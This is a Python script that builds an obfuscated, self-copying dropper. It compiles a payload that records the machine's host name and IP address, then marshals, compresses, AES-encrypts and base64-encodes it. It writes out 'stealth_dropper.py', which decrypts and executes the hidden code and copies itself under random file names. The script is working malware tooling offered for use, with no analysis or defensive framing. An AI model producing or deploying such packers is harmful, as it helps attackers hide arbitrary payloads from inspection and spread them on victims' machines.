import base64, zlib, marshal, os, socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def pad(s): return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
def unpad(s): return s[:-ord(s[-1])]
def gen_key(): return get_random_bytes(16)

payload = '''
import platform, socket
info = f"HOST: {platform.node()} | IP: {socket.gethostbyname(socket.gethostname())}"
with open("log.txt", "a") as f:
    f.write(info + "\\n")
'''

key = gen_key()
compiled = marshal.dumps(compile(payload, "<string>", "exec"))
compressed = zlib.compress(compiled)
cipher = AES.new(key, AES.MODE_ECB)
encrypted = cipher.encrypt(pad(compressed.hex()).encode())
encoded = base64.b64encode(encrypted).decode()
key_encoded = base64.b64encode(key).decode()

clone = f'''
import base64, zlib, marshal
from Crypto.Cipher import AES

def pad(s): return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
def unpad(s): return s[:-ord(s[-1])]
def decrypt(data, key):
    return unpad(AES.new(key, AES.MODE_ECB).decrypt(data).decode())

data = base64.b64decode("{encoded}")
key = base64.b64decode("{key_encoded}")
decompressed = bytes.fromhex(decrypt(data, key))
exec(marshal.loads(zlib.decompress(decompressed)))

import random, string
name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
with open(f"copy_{{name}}.py", "w") as f:
    f.write(open(__file__).read())
'''

with open("stealth_dropper.py", "w") as f:
    f.write(clone)
